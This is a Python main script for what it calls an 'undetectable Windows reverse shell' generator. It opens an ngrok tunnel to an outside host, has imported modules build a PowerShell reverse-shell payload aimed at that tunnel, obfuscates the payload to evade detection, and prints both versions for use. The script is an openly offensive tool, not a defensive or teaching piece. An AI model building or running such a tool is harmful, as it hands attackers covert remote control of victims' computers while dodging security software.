import argparse
import time
from generator import generate_reverse_shell
from obfuscator import obfuscate_script
from ngrok_manager import start_ngrok

def main():
    parser = argparse.ArgumentParser(description="Generate an undetectable Windows reverse shell PowerShell script.")
    parser.add_argument("-p", "--port", required=True, type=int, help="Port for the reverse shell connection")

    args = parser.parse_args()

    # Start ngrok tunnel and get the tunnel URL
    try:
        tunnel_url, ngrok_process = start_ngrok(args.port)
    except RuntimeError as e:
        print(e)
        return

    # Extract the ngrok host and port
    host, port = tunnel_url.replace("tcp://", "").split(":")

    # Generate PowerShell reverse shell script
    shell_code = generate_reverse_shell(host, int(port))

    # Obfuscate the PowerShell script
    obfuscated_code = obfuscate_script(shell_code)

    # Print the generated and obfuscated PowerShell scripts
    print("Generated PowerShell script:\n", shell_code)
    print("\nObfuscated PowerShell script:\n", obfuscated_code)
    print("\nngrok tunnel URL:", tunnel_url)

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        ngrok_process.terminate()

if __name__ == "__main__":
    main()
